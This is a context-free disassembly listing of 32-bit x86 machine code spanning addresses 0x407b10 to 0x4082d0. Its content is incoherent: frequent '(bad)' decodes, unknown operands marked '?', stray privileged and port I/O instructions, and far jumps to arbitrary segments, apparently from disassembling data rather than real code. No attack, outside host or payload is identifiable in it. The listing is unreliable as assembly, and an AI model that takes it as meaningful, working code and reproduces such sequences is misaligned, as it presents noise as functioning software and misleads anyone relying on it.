  407b10:	mov    dl,0x50
  407b12:	ins    BYTE PTR es:[edi],dx
  407b13:	pusha  
  407b14:	xor    eax,0x6da00fa3
  407b19:	cmc    
  407b1a:	ret    
  407b1b:	loope  0x407afa
  407b1d:	nop
  407b1e:	xor    DWORD PTR [esp+edi*2+0x50],ebx
  407b22:	mov    eax,ds:0xfb859203
  407b27:	test   al,0x6b
  407b29:	mov    eax,0xa06c8332
  407b2e:	push   ebp
  407b2f:	xchg   ebp,eax
  407b30:	(bad)  
  407b31:	(bad)  
  407b32:	loope  0x407b7c
  407b34:	xor    al,0x63
  407b36:	mov    edx,0xb0e56b56
  407b3b:	test   eax,0xf811f94d
  407b40:	mov    dh,0x7c
  407b42:	cwde   
  407b43:	push   ds
  407b44:	out    0xd,al
  407b46:	inc    ebx
  407b47:	xor    eax,DWORD PTR [esi]
  407b49:	jg     0x407b4b
  407b4b:	cmp    eax,0xa779f5d7
  407b50:	fistp  QWORD PTR [edi-0x57867e9b]
  407b56:	jno    0x407bcb
  407b58:	mov    bh,0xa7
  407b5a:	add    ah,cl
  407b5c:	mov    ah,0x30
  407b5e:	add    esp,DWORD PTR [edx+0x7c172b9e]
  407b64:	(bad)  
  407b65:	gs stos DWORD PTR es:[edi],eax
  407b67:	adc    al,0xed
  407b69:	xchg   edi,eax
  407b6a:	das    
  407b6b:	sub    eax,0x7c5b2824
  407b70:	mov    ebp,0xe53993a7
  407b75:	retf   0x29d
  407b78:	call   0x1dd73d23
  407b7d:	xlat   BYTE PTR ds:[ebx]
  407b7e:	or     bl,ah
  407b80:	sbb    BYTE PTR [ecx],bh
  407b82:	pop    ds
  407b83:	dec    esi
  407b84:	sbb    ebx,DWORD PTR [esi-0x174b2396]
  407b8a:	pop    es
  407b8b:	inc    edx
  407b8c:	lahf   
  407b8d:	fild   QWORD PTR [edi+0x1e3a0154]
  407b93:	push   ss
  407b94:	loop   0x407be8
  407b96:	(bad)  
  407b97:	mov    ch,bl
  407b99:	or     BYTE PTR [ecx-0x1d],cl
  407b9c:	add    al,0xe4
  407b9e:	pop    esi
  407b9f:	aas    
  407ba0:	cdq    
  407ba1:	add    DWORD PTR [ebx-0x67],edi
  407ba4:	sti    
  407ba5:	sub    eax,0xc7541825
  407baa:	shl    BYTE PTR [eax+0x33],cl
  407bad:	xchg   edx,eax
  407bae:	mov    cl,0x43
  407bb0:	adc    esi,edx
  407bb2:	or     ch,BYTE PTR ds:0x10767302
  407bb8:	push   ecx
  407bb9:	adc    ebx,esp
  407bbb:	daa    
  407bbc:	mov    esp,0xbaee9aa8
  407bc1:	fisttp WORD PTR [ecx+0x25]
  407bc4:	je     0x407b95
  407bc6:	mov    esp,ds
  407bc8:	mov    DWORD PTR [esi-0x5f3ae990],edi
  407bce:	pop    es
  407bcf:	scas   al,BYTE PTR es:[edi]
  407bd0:	pop    eax
  407bd1:	add    ch,bl
  407bd3:	jns    0x407b8c
  407bd5:	sbb    cl,BYTE PTR [esi]
  407bd7:	aaa    
  407bd8:	icebp  
  407bd9:	adc    dh,BYTE PTR [ecx]
  407bdb:	mov    bl,0x60
  407bdd:	dec    edi
  407bde:	imul   eax,DWORD PTR [ecx],0xffffff85
  407be1:	add    DWORD PTR [esi],ebx
  407be3:	lock sub al,0x64
  407be6:	(bad)  
  407be7:	out    dx,al
  407be8:	mov    ch,0x9f
  407bea:	pop    esi
  407beb:	pop    ss
  407bec:	or     DWORD PTR [edi+0x2ab543e4],ebx
  407bf2:	mov    ch,0x3a
  407bf4:	in     al,dx
  407bf5:	jp     0x407bfe
  407bf7:	jmp    0x80:0x13e636
  407bfe:	mov    ah,ch
  407c00:	call   0x5ef4a175
  407c05:	mov    ecx,0xd011271a
  407c0a:	mov    eax,0x26c84618
  407c0f:	inc    DWORD PTR [ecx+ebp*4]
  407c12:	test   al,0x3d
  407c14:	or     eax,0x7e623e99
  407c19:	ret    
  407c1a:	stos   DWORD PTR es:[edi],eax
  407c1b:	ins    DWORD PTR es:[edi],dx
  407c1c:	mov    eax,0x68258e16
  407c21:	add    DWORD PTR [edx-0x50],edi
  407c24:	(bad)
  407c27:	push   esi
  407c28:	mov    ch,0x4a
  407c2a:	xchg   DWORD PTR [edi-0xf15eb74],ebp
  407c30:	sub    BYTE PTR [ecx+0x65722442],dl
  407c36:	mov    ds:0x5e0ab794,al
  407c3b:	(bad)  
  407c3c:	cmc    
  407c3d:	add    esi,DWORD PTR [esi]
  407c3f:	add    BYTE PTR [eax-0x6c],cl
  407c42:	call   0xe084:0xda69becc
  407c49:	cwde   
  407c4a:	icebp  
  407c4b:	pop    ss
  407c4c:	test   DWORD PTR [edx],ebx
  407c4e:	adc    cl,BYTE PTR [edi]
  407c50:	pop    ds
  407c51:	xchg   edi,eax
  407c52:	(bad)  
  407c53:	not    DWORD PTR [esi+ebx*2+0x31]
  407c57:	out    0x96,eax
  407c59:	sub    BYTE PTR [ebx+0x36],dl
  407c5c:	mov    esp,0x3a74c26
  407c61:	cmc    
  407c62:	(bad)
  407c65:	sub    DWORD PTR [ebp+edi*2+0x1567ddf8],0x53092892
  407c70:	lods   al,BYTE PTR ds:[esi]
  407c71:	stos   BYTE PTR es:[edi],al
  407c72:	xchg   ebx,eax
  407c73:	fadd   st,st(7)
  407c75:	adc    ecx,ecx
  407c77:	xor    DWORD PTR [ebx],edx
  407c79:	sub    BYTE PTR [edi+0x51],ch
  407c7c:	aam    0x5
  407c7e:	cs aam 0xb
  407c81:	jmp    0x2e4c154e
  407c86:	add    edi,edx
  407c88:	jns    0x407cb3
  407c8a:	popf   
  407c8b:	pshufw mm6,QWORD PTR [esi],0x67
  407c8f:	jno    0x407c79
  407c91:	jbe    0x407cb5
  407c93:	xor    al,0x68
  407c95:	fidivr DWORD PTR [ebx-0x25718485]
  407c9b:	push   cs
  407c9c:	dec    eax
  407c9d:	nop
  407c9e:	jne    0x407cd9
  407ca0:	cli    
  407ca1:	adc    eax,0x70b49f54
  407ca6:	mov    eax,0xa5a8fa37
  407cab:	je     0x407c51
  407cad:	enter  0xb07a,0xef
  407cb1:	aad    0x3d
  407cb3:	and    DWORD PTR [ebx+0x21],ecx
  407cb6:	push   ebp
  407cb7:	cmp    eax,0x75f70e6f
  407cbc:	inc    esi
  407cbd:	inc    edx
  407cbe:	daa    
  407cbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407cc0:	pop    ss
  407cc1:	mov    dl,ch
  407cc3:	mov    dh,0xf1
  407cc5:	fcom   DWORD PTR [ecx-0x2b4e7b29]
  407ccb:	mov    BYTE PTR [eax+0x1a3901d5],dl
  407cd1:	adc    eax,0xc5415974
  407cd6:	add    bh,BYTE PTR [eax]
  407cd8:	pop    edi
  407cd9:	adc    al,0xb8
  407cdb:	pop    edx
  407cdc:	pop    edi
  407cdd:	jb     0x407c66
  407cdf:	dec    esi
  407ce0:	and    BYTE PTR [ebp-0x6e446f62],dl
  407ce6:	jne    0x407d54
  407ce8:	mov    cs,WORD PTR [edi]
  407cea:	jecxz  0x407d27
  407cec:	mov    bl,0x7f
  407cee:	push   0xe3b07f42
  407cf3:	xchg   edx,eax
  407cf4:	loopne 0x407d49
  407cf6:	mov    bl,0x82
  407cf8:	ins    BYTE PTR es:[edi],dx
  407cf9:	fld    st(5)
  407cfb:	jno    0x407cc9
  407cfd:	idiv   BYTE PTR [edx-0x75]
  407d00:	pop    ecx
  407d01:	lds    ebp,FWORD PTR [edx]
  407d03:	mov    bl,0x7d
  407d05:	adc    BYTE PTR [edx-0xb],dl
  407d08:	mov    cl,0xb0
  407d0a:	aaa    
  407d0b:	jo     0x407cb8
  407d0d:	out    dx,al
  407d0e:	std    
  407d0f:	adc    al,0x5c
  407d11:	inc    esp
  407d12:	mov    cl,0xa9
  407d14:	ror    esi,0x70
  407d17:	ins    DWORD PTR es:[edi],dx
  407d18:	mov    WORD PTR [edi],?
  407d1a:	scas   al,BYTE PTR es:[edi]
  407d1b:	repnz push ecx
  407d1d:	das    
  407d1e:	dec    edx
  407d20:	pop    ss
  407d21:	add    ah,BYTE PTR [eax]
  407d23:	adc    DWORD PTR [ebx+0x198406ae],esp
  407d29:	sbb    BYTE PTR [ebp-0x55aa34b1],al
  407d2f:	mov    cl,0xd1
  407d31:	push   ecx
  407d33:	sbb    al,0xf5
  407d35:	(bad)  
  407d36:	push   edi
  407d37:	cmc    
  407d38:	pop    es
  407d39:	icebp  
  407d3a:	push   0x0
  407d3c:	fs or  al,0xa5
  407d3f:	arpl   si,dx
  407d41:	outs   dx,DWORD PTR ds:[esi]
  407d42:	ds push ebx
  407d44:	js     0x407cc7
  407d46:	bound  ecx,QWORD PTR [edi+esi*2-0x4d]
  407d4a:	xor    al,0x36
  407d4c:	adc    ecx,ebx
  407d4e:	adc    eax,DWORD PTR [ebx+esi*8-0x47]
  407d52:	jnp    0x407d10
  407d54:	(bad)  
  407d55:	je     0x407ce6
  407d57:	sti    
  407d58:	add    al,0x75
  407d5a:	cmp    ecx,edx
  407d5c:	sub    eax,0x62e2e889
  407d61:	cmp    al,0x93
  407d63:	rol    BYTE PTR ds:0x46467483,cl
  407d69:	popf   
  407d6a:	test   DWORD PTR [esi-0x28fc1775],ebp
  407d70:	sub    BYTE PTR [edi-0x6dd4d139],dh
  407d76:	aas    
  407d77:	pop    ebp
  407d78:	mov    ds:0x3b912a3c,al
  407d7d:	jmp    0xeafa7909
  407d82:	adc    DWORD PTR [edi],esi
  407d84:	xchg   edi,eax
  407d85:	(bad)  
  407d86:	retf   0x4bcb
  407d89:	retf   
  407d8a:	mov    ebx,0x371faa3d
  407d8f:	inc    eax
  407d90:	(bad)
  407d93:	rol    DWORD PTR [esi-0x15],1
  407d96:	pcmpeqd mm1,mm5
  407d99:	adc    al,0x7f
  407d9b:	aaa    
  407d9c:	sub    DWORD PTR [esi+0x468e4acc],ebx
  407da2:	imul   ebp,DWORD PTR [edi],0xffffffd1
  407da5:	aas    
  407da6:	test   DWORD PTR [esi],ebx
  407da8:	adc    ch,BYTE PTR [ecx-0x4]
  407dab:	xchg   esp,eax
  407dac:	pop    edi
  407dad:	push   ebp
  407dae:	cld    
  407daf:	fisttp QWORD PTR [ecx+edi*4-0x33866e08]
  407db6:	retf   
  407db7:	and    ah,bh
  407db9:	xchg   ebp,eax
  407dba:	dec    eax
  407dbb:	fadd   QWORD PTR [edx+0x23]
  407dbe:	push   0x4
  407dc0:	cmp    eax,0x8bc7e833
  407dc5:	into   
  407dc6:	xor    ebx,edx
  407dc8:	mov    al,ds:0xf52a7cc6
  407dcd:	push   edx
  407dce:	and    esi,ecx
  407dd0:	sub    eax,0xf69dc64d
  407dd5:	inc    edx
  407dd6:	jp     0x407dd5
  407dd8:	mov    dh,0xfe
  407dda:	test   DWORD PTR [edx],edx
  407ddc:	in     al,0x8
  407dde:	loope  0x407d9b
  407de0:	cmp    eax,0x193f5efb
  407de5:	out    dx,al
  407de6:	cli    
  407de7:	xchg   ebp,eax
  407de8:	inc    esi
  407de9:	out    dx,al
  407dea:	or     DWORD PTR [ebx+0x56],ebp
  407ded:	pop    esi
  407dee:	mov    ebx,0xddb6d6da
  407df3:	das    
  407df4:	xchg   ecx,eax
  407df5:	inc    esp
  407df6:	out    dx,eax
  407df7:	clc    
  407df8:	push   0xb15d7440
  407dfd:	ja     0x407e47
  407dff:	mov    dh,0xd0
  407e01:	popf   
  407e02:	rol    DWORD PTR [edi+eiz*4],cl
  407e05:	or     eax,0x2a3b049b
  407e0a:	jle    0x407dd1
  407e0c:	push   esi
  407e0d:	aad    0x5f
  407e0f:	mov    eax,0x6a4d1da4
  407e14:	mov    edx,0xd8a0d19e
  407e19:	stc    
  407e1a:	sub    al,0xee
  407e1c:	sbb    al,0xa2
  407e1e:	ret    0x4031
  407e21:	or     edx,DWORD PTR [ebp+0x712d9501]
  407e27:	jae    0x407e3b
  407e29:	xor    esi,DWORD PTR [ebp-0x4416759c]
  407e2f:	(bad)  
  407e31:	or     eax,0xe8f153e5
  407e36:	dec    ebp
  407e37:	mov    esi,0xe6949e90
  407e3c:	stos   DWORD PTR es:[edi],eax
  407e3d:	lods   al,BYTE PTR ds:[esi]
  407e3e:	das    
  407e3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e40:	std    
  407e41:	retf   
  407e42:	nop
  407e43:	inc    edi
  407e44:	xchg   BYTE PTR [edx],ah
  407e46:	test   BYTE PTR [edi-0x56678146],ch
  407e4c:	push   edx
  407e4d:	mov    ch,0x10
  407e4f:	retf   
  407e50:	sub    al,0x8f
  407e52:	jl     0x407e86
  407e54:	jge    0x407e18
  407e56:	adc    eax,0x2497dc2d
  407e5b:	mov    eax,ds:0xd0f0c026
  407e60:	add    DWORD PTR [ecx-0x46],esp
  407e63:	push   edi
  407e64:	xchg   DWORD PTR [ebp+0x3a],esp
  407e67:	xchg   ebx,eax
  407e68:	xchg   DWORD PTR [edx],esi
  407e6a:	sar    dl,cl
  407e6c:	addr16 mov edx,0x85e8be4d
  407e72:	std    
  407e73:	cmp    BYTE PTR [edx-0xf],cl
  407e76:	cli    
  407e77:	add    al,cl
  407e79:	sbb    DWORD PTR [ebx+edi*8+0x5e],0x30fc1ff0
  407e81:	in     al,dx
  407e82:	cmp    BYTE PTR [ebx+0x35df73d],0xcb
  407e89:	mov    ?,eax
  407e8b:	aas    
  407e8c:	mov    bl,0x3
  407e8e:	inc    ebx
  407e8f:	and    ebx,edx
  407e91:	dec    ebx
  407e92:	fcom   DWORD PTR [eax-0x48]
  407e95:	inc    ecx
  407e96:	cmp    bh,bh
  407e98:	jecxz  0x407e73
  407e9a:	int3   
  407e9b:	xchg   ecx,eax
  407e9c:	inc    edx
  407e9d:	mov    DWORD PTR [ecx+0x4ad36d9f],esp
  407ea3:	mov    DWORD PTR [esi+0x53],edx
  407ea6:	xor    eax,0xee6871b4
  407eab:	scas   al,BYTE PTR es:[edi]
  407eac:	mov    cl,0x1b
  407eae:	int    0xec
  407eb0:	mov    bh,0x2
  407eb2:	inc    esi
  407eb3:	mov    WORD PTR [ecx+ebp*2+0x6c37105c],gs
  407eba:	adc    DWORD PTR [edx+0x2519629],esp
  407ec0:	daa    
  407ec1:	fiadd  DWORD PTR [ecx+0x518c98ff]
  407ec7:	and    al,0x3d
  407ec9:	sbb    ah,BYTE PTR [ecx-0x68]
  407ecc:	rcr    BYTE PTR [ecx-0x23],1
  407ecf:	int    0x9e
  407ed1:	mov    ah,0x73
  407ed3:	xor    BYTE PTR [eax],ch
  407ed5:	xchg   ecx,eax
  407ed6:	xchg   esi,eax
  407ed7:	pop    ds
  407ed8:	jns    0x407f3d
  407eda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407edb:	loope  0x407e9f
  407edd:	sbb    eax,0x6f618a01
  407ee2:	mov    ecx,0xed5fa15c
  407ee7:	jecxz  0x407f29
  407ee9:	into   
  407eea:	dec    eax
  407eeb:	xor    dh,0xef
  407eee:	push   esp
  407eef:	fist   WORD PTR [ebx-0x28]
  407ef2:	fwait
  407ef3:	movd   mm4,DWORD PTR [eax-0x7600a70]
  407efa:	and    al,0xee
  407efc:	dec    ecx
  407efd:	ja     0x407e8b
  407eff:	mov    ch,0x18
  407f01:	push   ecx
  407f02:	xor    edi,DWORD PTR [ecx-0x6fe38763]
  407f08:	out    dx,al
  407f09:	and    esp,0xcee6faa7
  407f0f:	shl    BYTE PTR [esi-0xd8d290a],1
  407f15:	ss popf 
  407f17:	rcl    DWORD PTR [ebp+ebx*4-0x9],1
  407f1b:	xchg   ecx,eax
  407f1c:	jmp    0xcf65:0x9fff69c
  407f23:	ins    DWORD PTR es:[edi],dx
  407f24:	or     cl,BYTE PTR [eax-0x1e2d2efe]
  407f2a:	and    al,0x33
  407f2c:	mov    es,esi
  407f2e:	ret    0x404d
  407f31:	sbb    DWORD PTR [edx],edi
  407f33:	mov    ebx,0x45ab1924
  407f38:	es cld 
  407f3a:	cmc    
  407f3b:	jge    0x407f90
  407f3d:	retf   0x618
  407f40:	(bad)  
  407f41:	loop   0x407f62
  407f43:	pop    edi
  407f44:	push   cs
  407f45:	add    eax,0x98af8423
  407f4a:	or     DWORD PTR [esi+eax*1-0x4a],ebp
  407f4e:	lea    ebp,[edx+0x35]
  407f51:	bswap  esp
  407f53:	push   ebx
  407f54:	mov    ch,0xcf
  407f56:	pushf  
  407f57:	jmp    0x65235779
  407f5c:	sub    DWORD PTR [edx-0x3f],0x72
  407f60:	retf   
  407f61:	fwait
  407f62:	sub    bh,BYTE PTR [edi]
  407f64:	test   DWORD PTR [ecx-0x2a],edx
  407f67:	or     BYTE PTR [edx-0x49],bl
  407f6a:	xor    eax,0xf8823425
  407f6f:	push   esi
  407f70:	pop    edx
  407f71:	inc    ebx
  407f72:	adc    al,0xf5
  407f74:	push   ecx
  407f75:	dec    ebx
  407f76:	test   BYTE PTR cs:[ebx+0x57],dh
  407f7a:	cs popf 
  407f7c:	push   cs
  407f7d:	sbb    eax,0xafb00bab
  407f82:	jmp    0xc5f5:0xa74dfda7
  407f89:	les    ebx,FWORD PTR [eax+edi*4-0x2]
  407f8d:	test   ch,bl
  407f8f:	xchg   edx,eax
  407f90:	cli    
  407f91:	mov    ebp,0xe28ef779
  407f96:	gs cli 
  407f98:	adc    eax,0xc11991ae
  407f9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f9e:	stos   DWORD PTR es:[edi],eax
  407f9f:	adc    cl,BYTE PTR [edx-0x5856d809]
  407fa5:	and    BYTE PTR cs:[edi],ch
  407fa8:	out    dx,al
  407fa9:	(bad)
  407fad:	add    dl,BYTE PTR [ecx]
  407faf:	cld    
  407fb0:	cmp    esi,ebp
  407fb2:	test   DWORD PTR cs:[edx+0x7fe210aa],edx
  407fb9:	dec    edi
  407fba:	inc    edi
  407fbb:	push   ss
  407fbc:	pop    ds
  407fbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fbe:	leave  
  407fbf:	scas   al,BYTE PTR es:[edi]
  407fc0:	in     eax,dx
  407fc1:	xlat   BYTE PTR ds:[ebx]
  407fc2:	(bad)  
  407fc3:	hlt    
  407fc4:	jae    0x407ff7
  407fc6:	fnstcw WORD PTR [ecx+0x2b584a4a]
  407fcc:	inc    eax
  407fcd:	mov    bh,ah
  407fcf:	out    0x6d,al
  407fd1:	es inc esi
  407fd3:	stos   DWORD PTR es:[edi],eax
  407fd4:	sub    al,0x75
  407fd6:	dec    ecx
  407fd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fd8:	mov    eax,0x698130be
  407fdd:	mov    esi,0xeecec194
  407fe2:	fwait
  407fe3:	out    0x38,al
  407fe5:	jns    0x407fe8
  407fe7:	sub    eax,DWORD PTR [edx-0x77316be3]
  407fed:	mov    esp,0x5defc1b9
  407ff2:	or     al,0x34
  407ff4:	mov    ebp,0xb866e4ae
  407ff9:	xchg   edi,eax
  407ffa:	mov    ebx,0xb1d89814
  407fff:	(bad)  
  408000:	aad    0x28
  408002:	stos   DWORD PTR es:[edi],eax
  408003:	pop    esp
  408004:	push   ebp
  408005:	dec    ebx
  408006:	mov    esi,0x83ee03a4
  40800b:	sbb    dl,dh
  40800d:	inc    ecx
  40800e:	into   
  40800f:	mov    bl,0xca
  408011:	es ret 
  408013:	inc    esp
  408014:	mov    esi,0x4f05c019
  408019:	push   0x2f
  40801b:	jl     0x407fea
  40801d:	adc    al,0x9c
  40801f:	aaa    
  408020:	mov    ebp,esi
  408022:	popa   
  408023:	in     al,dx
  408024:	test   BYTE PTR [eax+0xd],0x3f
  408028:	pushf  
  408029:	ins    BYTE PTR es:[edi],dx
  40802a:	test   bh,ch
  40802c:	cmc    
  40802d:	mov    edx,ebp
  40802f:	enter  0x1a28,0x19
  408033:	mov    edx,0x9400a67a
  408038:	call   0xda13:0x6c4fa09c
  40803f:	dec    eax
  408040:	call   0x5e54d07d
  408045:	shl    DWORD PTR [ecx],cl
  408047:	add    ebp,DWORD PTR [eax]
  408049:	and    esp,DWORD PTR [eax-0x55]
  40804c:	cdq    
  40804d:	inc    ecx
  40804e:	fistp  QWORD PTR [ebx+0x4d]
  408051:	inc    esi
  408052:	shl    BYTE PTR [eax+0x62],0x11
  408056:	mov    eax,ds:0x292a613f
  40805b:	shl    eax,cl
  40805d:	push   ds
  40805e:	les    edx,FWORD PTR [eax]
  408060:	mov    bh,0xee
  408062:	adc    edi,esi
  408064:	and    ch,BYTE PTR [eax-0x2]
  408067:	in     eax,0x62
  408069:	sub    ah,dl
  40806b:	mov    al,0xf9
  40806d:	push   eax
  40806e:	xchg   edi,eax
  40806f:	ffreep st(1)
  408071:	movlps xmm3,QWORD PTR [eax]
  408074:	or     BYTE PTR [edx+edx*8-0x6d5c7369],cl
  40807b:	sub    DWORD PTR [esi],ecx
  40807d:	or     dh,0x9e
  408080:	mov    eax,ds:0x5c2d681e
  408085:	xchg   esp,eax
  408086:	adc    ebx,DWORD PTR [esi+eiz*8-0x70]
  40808a:	aad    0x21
  40808c:	add    ch,0xe4
  40808f:	fwait
  408090:	lahf   
  408091:	push   edi
  408092:	jno    0x408043
  408094:	(bad)  
  408095:	fmulp  st(4),st
  408097:	retf   
  408098:	fsubr  DWORD PTR [esi-0x2f]
  40809b:	lahf   
  40809c:	mov    edx,0x2ea1fc24
  4080a1:	in     al,0x13
  4080a3:	imul   dl
  4080a5:	mov    ds:0x52072b6f,al
  4080aa:	out    0xb8,al
  4080ac:	and    dl,ch
  4080ae:	cmp    al,0x25
  4080b0:	mov    bh,0x3d
  4080b2:	retf   0x30f8
  4080b5:	and    al,0x81
  4080b7:	les    edx,FWORD PTR [edx+ecx*2-0x4dbd72eb]
  4080be:	cmc    
  4080bf:	jbe    0x4080ad
  4080c1:	call   0x3042:0x23f46265
  4080c8:	dec    esi
  4080c9:	ss daa 
  4080cb:	outs   dx,DWORD PTR ds:[esi]
  4080cc:	pop    ds
  4080cd:	mov    bl,0xf7
  4080cf:	inc    edi
  4080d0:	and    BYTE PTR [edx],dh
  4080d2:	jecxz  0x40808f
  4080d4:	loope  0x408131
  4080d6:	add    bl,0x7
  4080d9:	push   esi
  4080da:	pop    ebx
  4080db:	mov    edx,0xb6cdc143
  4080e0:	daa    
  4080e1:	out    0xc4,eax
  4080e3:	xor    bl,BYTE PTR gs:[eax]
  4080e6:	out    dx,al
  4080e7:	or     eax,0xbcf17e21
  4080ec:	mov    esi,DWORD PTR [ebx+0x4e610508]
  4080f2:	jno    0x4080bb
  4080f4:	inc    edx
  4080f5:	mov    fs,WORD PTR [ebx+0x1cfc74f6]
  4080fb:	xor    BYTE PTR [eax+0x30796bf2],al
  408101:	pop    ss
  408102:	cmp    DWORD PTR [esp+ecx*4-0xd1cdd2a],edi
  408109:	aaa    
  40810a:	inc    eax
  40810b:	neg    DWORD PTR [ebx+0x493d71b1]
  408111:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408112:	out    0xe9,al
  408114:	xchg   ecx,eax
  408115:	mov    esi,0x7894dd65
  40811a:	mov    cl,BYTE PTR [bp+di-0x3f]
  40811e:	rol    BYTE PTR [ecx+0x8ad8148],cl
  408124:	shl    ah,cl
  408126:	mov    dh,0xda
  408128:	(bad)  
  408129:	cmp    BYTE PTR [esi],dh
  40812b:	push   ecx
  40812c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40812d:	mov    ?,WORD PTR [ecx-0x10aaa3ab]
  408133:	(bad)  
  408134:	std    
  408135:	enter  0xd851,0x7d
  408139:	cmp    DWORD PTR [edi-0x1a],0xfffffff5
  40813d:	cmp    DWORD PTR [esi],esi
  40813f:	fdiv   DWORD PTR [eax-0x7c]
  408142:	sahf   
  408143:	(bad)  [edx+0x66943f9a]
  408149:	loope  0x40814a
  40814b:	lahf   
  40814c:	adc    eax,0x3a686fce
  408151:	pop    edx
  408152:	cmp    al,BYTE PTR [edi]
  408154:	outs   dx,DWORD PTR ds:[esi]
  408155:	inc    ecx
  408156:	aas    
  408157:	cmc    
  408158:	pop    es
  408159:	jecxz  0x40812e
  40815b:	retf   0x6495
  40815e:	mov    edx,0x736fd27d
  408163:	lock fnsave [ecx+0x1c549ef7]
  40816a:	mov    WORD PTR [edx+0xb],?
  40816d:	inc    edi
  40816e:	in     al,dx
  40816f:	adc    ch,BYTE PTR [edi]
  408171:	out    dx,al
  408172:	and    al,0xa2
  408174:	add    DWORD PTR [eax+0x7f],0x62
  408178:	xor    BYTE PTR fs:[edx-0x4c2aba2a],0x2a
  408180:	fbstp  TBYTE PTR [edx]
  408182:	stos   BYTE PTR es:[edi],al
  408183:	gs adc eax,0x6acd10e2
  408189:	fwait
  40818a:	outs   dx,BYTE PTR ds:[esi]
  40818b:	imul   edx,esp,0xc7d017ce
  408191:	retf   0xdcc8
  408194:	dec    ecx
  408195:	shr    DWORD PTR [esi],1
  408197:	lods   al,BYTE PTR ds:[esi]
  408198:	or     DWORD PTR [esi-0x42ca204c],ebp
  40819e:	jbe    0x4081ac
  4081a0:	(bad)  
  4081a1:	retf   
  4081a2:	out    dx,eax
  4081a3:	int3   
  4081a4:	inc    ebp
  4081a5:	scas   al,BYTE PTR es:[edi]
  4081a6:	or     al,0x72
  4081a8:	jmp    0x2f6f7130
  4081ad:	push   ss
  4081ae:	jae    0x40819e
  4081b0:	(bad)  
  4081b2:	gs popf 
  4081b4:	inc    ebx
  4081b5:	scas   al,BYTE PTR es:[edi]
  4081b6:	(bad)
  4081b9:	push   ebp
  4081ba:	icebp  
  4081bb:	lahf   
  4081bc:	dec    eax
  4081bd:	arpl   WORD PTR [esi+0x3d],dx
  4081c0:	mov    esi,0x1e1f7aee
  4081c5:	(bad)  
  4081c6:	pop    ss
  4081c7:	rol    BYTE PTR [esp+ebp*2-0x17],cl
  4081cb:	and    eax,0xdfde7c0f
  4081d0:	cmp    BYTE PTR [esi],dl
  4081d2:	push   ds
  4081d3:	xor    BYTE PTR [ebx],bl
  4081d5:	mov    esi,0xbd4433c2
  4081da:	les    ecx,FWORD PTR [eax+eax*2-0x30]
  4081de:	imul   esi,DWORD PTR [esi+ebp*1+0x1],0xffffff92
  4081e3:	xchg   esi,eax
  4081e4:	ret    0x8b63
  4081e7:	cmp    DWORD PTR [edx],ecx
  4081e9:	inc    DWORD PTR [esi+0x4b]
  4081ec:	aad    0x95
  4081ee:	aaa    
  4081ef:	mov    esi,0xb8e1f3ca
  4081f4:	gs xor eax,0xcd587901
  4081fa:	dec    esi
  4081fb:	repz xchg edi,eax
  4081fd:	mov    edx,0x27c92773
  408202:	mov    dh,0xb0
  408204:	(bad)  
  408205:	mov    DWORD PTR [eax+0x340867cd],eax
  40820b:	ret    0x12fa
  40820e:	cmp    al,0x50
  408210:	cmc    
  408211:	xor    DWORD PTR [ebx],0xa48dea3c
  408217:	test   BYTE PTR [eax],ah
  408219:	sub    al,0x69
  40821b:	cmc    
  40821c:	push   eax
  40821d:	test   dh,ah
  40821f:	bound  edi,QWORD PTR [esp+edi*2]
  408222:	loopne 0x408249
  408224:	jecxz  0x408296
  408226:	inc    ebx
  408227:	inc    edx
  408228:	lods   al,BYTE PTR ds:[esi]
  408229:	std    
  40822a:	add    BYTE PTR [ebx],0x0
  40822d:	fwait
  40822e:	out    0x80,al
  408230:	inc    eax
  408231:	inc    eax
  408232:	push   edi
  408233:	jl     0x408253
  408235:	jbe    0x4081cd
  408237:	pop    esp
  408238:	dec    edi
  408239:	pop    eax
  40823a:	mov    ds:0x36bd93b1,eax
  40823f:	sbb    eax,0x765446c6
  408244:	sbb    DWORD PTR [ebx-0x23000b4d],0x617a60e9
  40824e:	push   es
  40824f:	pop    eax
  408250:	jnp    0x40826d
  408252:	mov    al,ds:0x7c9f00b4
  408257:	daa    
  408258:	movhps xmm0,QWORD PTR [ecx-0x5e]
  40825c:	stc    
  40825d:	cmp    ecx,ecx
  40825f:	sbb    al,0xa4
  408261:	ins    BYTE PTR es:[edi],dx
  408262:	jne    0x4082a3
  408264:	push   esi
  408265:	call   0x6c6f:0xa23dee9e
  40826c:	adc    al,bl
  40826e:	ja     0x40824d
  408270:	sti    
  408271:	push   cs
  408272:	xchg   ebp,eax
  408273:	pop    esi
  408274:	xor    bh,BYTE PTR [ebp-0x5c2f21ad]
  40827a:	sbb    esp,DWORD PTR [esp+ebx*4]
  40827d:	daa    
  40827e:	pop    ebx
  40827f:	adc    al,BYTE PTR [edx+0x35]
  408282:	and    BYTE PTR [ecx-0x72],ch
  408285:	icebp  
  408286:	fidiv  DWORD PTR [edi+0x7f359d24]
  40828c:	ja     0x408221
  40828e:	and    al,0xfd
  408290:	fidiv  DWORD PTR [esi+ecx*2]
  408293:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408294:	xlat   BYTE PTR ds:[ebx]
  408295:	aaa    
  408296:	in     al,dx
  408297:	jmp    0xce3afd64
  40829c:	sub    ah,dh
  40829e:	push   esp
  40829f:	repnz ss lock aaa 
  4082a3:	ins    DWORD PTR es:[edi],dx
  4082a4:	std    
  4082a5:	mov    bh,0xfa
  4082a7:	mov    edi,0xaf26be29
  4082ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082ad:	mov    ch,0x6b
  4082af:	(bad)  
  4082b0:	int3   
  4082b1:	xor    bl,ah
  4082b3:	cmp    BYTE PTR ss:[eax-0x46],0x30
  4082b8:	test   eax,0x1da79bc
  4082bd:	shr    bl,1
  4082bf:	sahf   
  4082c0:	push   ebx
  4082c1:	sbb    ch,BYTE PTR [eax+0x471860c5]
  4082c7:	jge    0x408275
  4082c9:	(bad)  
  4082cb:	push   ebp
  4082cc:	push   es
  4082cd:	xchg   ebx,eax
  4082ce:	repnz cmc 
  4082d0:	pop    ss
